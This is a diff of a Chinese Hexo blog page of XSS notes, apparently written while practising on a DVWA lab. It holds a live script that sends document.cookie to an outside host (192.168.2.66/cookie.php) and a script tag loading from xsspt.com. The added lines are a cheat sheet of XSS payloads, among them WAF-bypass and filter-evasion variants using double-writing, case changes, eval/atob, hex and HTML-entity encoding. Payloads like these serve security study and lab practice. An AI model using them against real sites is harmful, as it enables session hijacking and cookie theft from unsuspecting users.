@@ -5,12 +5,12 @@
   
   <title>xss漏洞 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="http:&#x2F;&#x2F;192.168.2.103&#x2F;DVWA-master&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name&#x3D;root# document.location&#x3D;&#39;http:&#x2F;&#x2F;192.168.2.66&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie    1&lt;script&gt;alert(1)&lt;&#x2F;script&gt;    p">
+  <meta name="description" content="http:&#x2F;&#x2F;192.168.2.103&#x2F;DVWA-master&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name&#x3D;root# document.location&#x3D;&#39;http:&#x2F;&#x2F;192.168.2.66&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie  xss攻击标签&gt;可以用&#x2F;&#x2F;代替。()可以用&#96;&#96;代">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xss漏洞">
 <meta property="og:url" content="http://example.com/2024/01/16/xss%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="http:&#x2F;&#x2F;192.168.2.103&#x2F;DVWA-master&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name&#x3D;root# document.location&#x3D;&#39;http:&#x2F;&#x2F;192.168.2.66&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie    1&lt;script&gt;alert(1)&lt;&#x2F;script&gt;    p">
+<meta property="og:description" content="http:&#x2F;&#x2F;192.168.2.103&#x2F;DVWA-master&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name&#x3D;root# document.location&#x3D;&#39;http:&#x2F;&#x2F;192.168.2.66&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie  xss攻击标签&gt;可以用&#x2F;&#x2F;代替。()可以用&#96;&#96;代">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117104554284.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117104721692.png">
@@ -44,7 +44,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119104334965.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119104353011.png">
 <meta property="article:published_time" content="2024-01-16T06:52:44.000Z">
-<meta property="article:modified_time" content="2024-01-19T03:07:53.245Z">
+<meta property="article:modified_time" content="2024-02-29T11:28:23.183Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117104554284.png">
@@ -79,7 +79,7 @@
     <h2 class="author">John Doe</h2>
     <h3 class="description"></h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>53</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>65</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>1</strong><br>标签</div></a>
     </div>
@@ -140,9 +140,16 @@
         <p><a target="_blank" rel="noopener" href="http://192.168.2.103/DVWA-master/DVWA-master/vulnerabilities/xss_r/?name=root#">http://192.168.2.103/DVWA-master/DVWA-master/vulnerabilities/xss_r/?name=root#</a></p>
 <script>document.location='http://192.168.2.66/cookie.php?cookie='+document.cookie</script>
 
+<h3 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h3><p>标签&gt;可以用&#x2F;&#x2F;代替。()可以用&#96;&#96;代替。</p>
+<h4 id="常用语句："><a href="#常用语句：" class="headerlink" title="常用语句："></a>常用语句：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;h5&gt;1&lt;/h5&gt;</span><br><span class="line">&lt;span&gt;1&lt;/span&gt;</span><br><span class="line">&lt;script&gt;console.log(1);&lt;/script&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;</span><br><span class="line">&#x27;onclick = &#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure>
 
+<p>绕waf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &lt;details open ontoggle=testdemo&gt;</span><br><span class="line">payload &lt;input type=submit formaction=javascript:alert`1`&gt;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=https://xsspt.com/VBAhTu&gt;&lt;/script&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;img src=https://www.baidu.com/img/bd_logo1.png onload=alert(1)&gt;</span><br><span class="line">&lt;details open ontoggle=alert(1)&gt;</span><br><span class="line">&lt;body onload=alert(1)&gt;</span><br><span class="line">&lt;M onmouseover=alert(1)&gt;M</span><br><span class="line">&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=alert(1)&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; onfocus=alert(1)&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; onclick=alert(1)&gt;</span><br><span class="line">&lt;form&gt;&lt;input type=&quot;submit&quot; formaction=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 空格被过滤 --&gt;</span><br><span class="line">&lt;img/src=&quot;1&quot;/onerror=alert(1)&gt;</span><br><span class="line">    </span><br><span class="line">&lt;!-- 双写绕过 --&gt;</span><br><span class="line">&lt;iimgmg src=1 oonerrornerror=aimglert(1)&gt;</span><br><span class="line">    </span><br><span class="line">&lt;!-- 大小写绕过  --&gt;</span><br><span class="line">&lt;iMg src=1 oNerRor=alert(1)&gt;</span><br><span class="line">    </span><br><span class="line">&lt;!-- 利用eval() --&gt;</span><br><span class="line">&lt;img src=1 onerror=&quot;a=`aler`;b=`t(1)`;eval(a+b);&quot;&gt;</span><br><span class="line">&lt;img src=1 onerror=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;</span><br><span class="line">    </span><br><span class="line">&lt;!-- 利用location --&gt;</span><br><span class="line">&lt;img src=1 onerror=location=&#x27;javascript:%61%6C%65%72%74%28%31%29&#x27;&gt;</span><br><span class="line">&lt;img src=1 onerror=location=&#x27;javascript:\x61\x6C\x65\x72\x74\x28\x31\x29&#x27;&gt;</span><br><span class="line">&lt;img src=1 onerror=location=&quot;javascr&quot;+&quot;ipt:&quot;+&quot;%61%6C%65%72%74%28%31%29&quot;&gt;</span><br><span class="line">    </span><br><span class="line">&lt;!-- 括号被过滤 --&gt;</span><br><span class="line">&lt;img src=1 onerror=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br><span class="line">    </span><br><span class="line">&lt;!-- onerror=被过滤 --&gt;</span><br><span class="line">&lt;img src=1 onerror     =alert(1)&gt;</span><br><span class="line">&lt;img src=1 onerror</span><br><span class="line">=alert(1)&gt;</span><br><span class="line">    </span><br><span class="line">&lt;!-- 属性被转换为大写 --&gt;</span><br><span class="line">&lt;img src=1 onerror=&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029;&gt;</span><br><span class="line">    </span><br><span class="line">&lt;!-- 编码后被检测 --&gt;</span><br><span class="line">&lt;img src=1 onerror=&amp;#x00000061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 上面的绕过是比较常见的姿势了，下面将结合实例讲XSS的绕过&gt;</span><br></pre></td></tr></table></figure>
 
 
 
@@ -336,7 +343,7 @@
     <h2 class="author">John Doe</h2>
     <h3 class="description"></h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>53</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>65</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>1</strong><br>标签</div></a>
     </div>
